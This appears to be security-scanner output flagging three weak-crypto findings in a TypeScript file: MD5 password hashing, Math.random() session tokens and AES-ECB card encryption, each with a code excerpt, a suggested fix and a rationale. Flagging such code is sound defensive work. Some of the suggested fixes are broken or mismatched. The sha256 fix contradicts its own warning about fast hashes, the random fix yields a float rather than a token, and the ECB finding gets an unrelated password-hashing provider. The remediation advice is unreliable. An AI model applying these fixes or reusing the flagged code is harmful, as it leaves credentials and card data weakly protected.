HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
------------------------------------------------------------------------
 src/crypto.ts:5:35

  3 | 
  4 | export function hashPassword(password: string): string {
  5 |   const passwordHash = createHash('md5').update(password).digest('hex')
    |                                   ~~~~~ fast hash protecting a credential
  6 |   return passwordHash
  7 | }

 -> fix (NestJS)   Replace the broken digest algorithm with sha256 (or
                   prefer scrypt/argon2 for passwords).
                   'sha256'
 -> why            This hash is fast, and speed is the attacker's
                   advantage: a commodity GPU tries billions of
                   candidates a second, so a leaked table of these
                   hashes is a leaked table of the values behind them.
                   Password hashing needs a deliberately slow algorithm
                   with a per-value salt.
 i  ref            OWASP A02:2021 | CWE-327 | RULES.md#weak-crypto

------------------------------------------------------------------------
HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
------------------------------------------------------------------------
 src/crypto.ts:10:24

   8 | 
   9 | export function mintSessionToken(): string {
  10 |   const sessionToken = Math.random().toString(36).slice(2)
     |                        ~~~~~~~~~~~~~ predictable random source used for a secret
  11 |   return sessionToken
  12 | }

 -> fix (NestJS)   Use Web Crypto (or node:crypto) instead of
                   Math.random() for tokens.
                   (globalThis.crypto.getRandomValues(new Uint32Array(1))[0] / 0x100000000)
 -> why            Math.random() is a fast PRNG, not a cryptographic
                   one; V8 documents it as unsuitable for security. An
                   attacker who sees a few outputs can predict the rest,
                   which for a session id or a reset token means minting
                   valid ones.
 i  ref            OWASP A02:2021 | CWE-327 | RULES.md#weak-crypto

------------------------------------------------------------------------
HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
------------------------------------------------------------------------
 src/crypto.ts:15:18

  13 | 
  14 | export function sealCard(pan: string, key: Buffer): Buffer {
  15 |   const cipher = createCipheriv('aes-256-ecb', key, null)
     |                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ broken cipher
  16 |   return Buffer.concat([cipher.update(pan, 'utf8'), cipher.final()])
  17 | }

 -> fix (NestJS)   Put the hashing behind a provider so every caller
                   gets the same algorithm, rather than each service
                   choosing one.
                   @Injectable()
                   export class PasswordService {
                     async hash(plain: string) {
                       return await argon2.hash(plain)
                     }
                     async verify(hash: string, plain: string) {
                       return await argon2.verify(hash, plain)
                     }
                   }
 -> why            This cipher or mode is broken independently of the
                   key. DES has a keyspace small enough to search, RC4
                   has biased output, and ECB encrypts identical
                   plaintext blocks to identical ciphertext blocks — the
                   structure of the data survives encryption.
 i  ref            OWASP A02:2021 | CWE-327 | RULES.md#weak-crypto

